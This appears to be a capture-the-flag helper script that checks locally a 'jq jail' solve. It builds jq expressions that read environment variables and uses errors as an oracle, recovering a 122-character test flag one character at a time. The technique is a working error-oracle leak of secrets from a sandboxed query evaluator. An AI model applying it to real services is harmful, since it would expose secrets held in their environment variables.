import subprocess
import string
import solve_remote_live, json

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def simulate_local_query(expr, test_flag):
    cmd = ["jq", "-n", expr]
    res = subprocess.run(cmd, capture_output=True, env={"FLAG": test_flag})
    if res.returncode != 0:
        return "error"
    return "ok"

def verify():
    # Construct a realistic 122-character test flag
    prefix = "jail{"
    suffix = "}"
    body = "a1_b2_c3_d4_e5_f6_g7_h8_i9_j0_k1_l2_m3_n4_o5_p6_q7_r8_s9_t0_u1_v2_w3_x4_y5_z6_hello_world_this_is_a_super_long_flag_for_123"
    test_flag = prefix + body[:122 - len(prefix) - len(suffix)] + suffix
    print(f"[*] Test Flag Length: {len(test_flag)}")
    assert len(test_flag) == 122, f"Length is {len(test_flag)}"

    charset = string.ascii_lowercase + string.digits + "_{}"
    
    # Pre-verify that every possible char in charset has a valid chain in CHAINS
    missing_chains = []
    for c in charset:
        if ord(c) not in CHAINS:
            missing_chains.append((c, ord(c)))
    print(f"[*] Missing ASCII chains in lookup table: {missing_chains}")

    recovered = ["?"] * len(test_flag)
    
    # Test extraction for positions 0..121
    print("[*] Running direct indexing extraction locally...")
    ambiguous = 0
    missing = 0

    for pos in range(len(test_flag)):
        matches = []
        for c in charset:
            v = ord(c)
            if v not in CHAINS:
                continue
            pred = predicate(CHAINS[v])
            # Direct indexing expression
            expr = f"[env|flatten|sort|last|explode|tostream]|.[{pos}]|last|{pred}|error"
            if simulate_local_query(expr, test_flag) == "error":
                matches.append(c)

        if len(matches) == 1:
            recovered[pos] = matches[0]
        elif len(matches) > 1:
            ambiguous += 1
            print(f"[!] Pos {pos:3d}: ambiguous {matches}")
        else:
            missing += 1
            print(f"[-] Pos {pos:3d}: missing match")

    result = "".join(recovered)
    print("\n" + "="*80)
    print(f"[+] RECOVERED FLAG: {result}")
    print("="*80)
    print(f"Stats: {ambiguous} ambiguous, {missing} missing out of 122 positions")

    if result == test_flag:
        print("\n[***] PERFECT 100% SUCCESS: DIRECT INDEXING FULLY RECOVERS 122-CHAR FLAG WITH ZERO ERRORS! [***]")

if __name__ == "__main__":
    verify()
